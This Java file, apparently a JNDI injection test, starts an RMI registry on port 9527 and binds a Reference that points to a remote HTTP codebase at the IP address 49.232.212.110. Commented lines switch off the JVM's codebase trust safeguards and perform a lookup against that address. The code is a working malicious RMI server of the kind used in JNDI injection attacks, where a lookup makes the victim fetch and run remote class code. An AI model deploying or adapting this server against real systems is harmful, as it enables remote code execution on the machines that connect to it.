package cn.spider.app.jndi;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiClientTest {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
//        System.setProperty("java.rmi.server.useCodebaseOnly","false");
//        System.setProperty("com.sun.jndi.rmi.object.trustURICodebase","true");
//        Context context = new InitialContext();
//        context.lookup("rmi://49.232.212.110:8080/aaa");
        String className = "aaa";
        String classNameServer = "http://49.232.212.110:8080/";

        int port = 9527;
        String rmiClassName = "aaa";
        Registry registry = LocateRegistry.createRegistry(port);
        Reference r = new Reference(className, classNameServer, classNameServer);
        registry.bind(rmiClassName, new ReferenceWrapper(r));
        System.out.println("启动rmi服务:localhost:" + 9527 + ",对外开放: " + rmiClassName);
    }
}
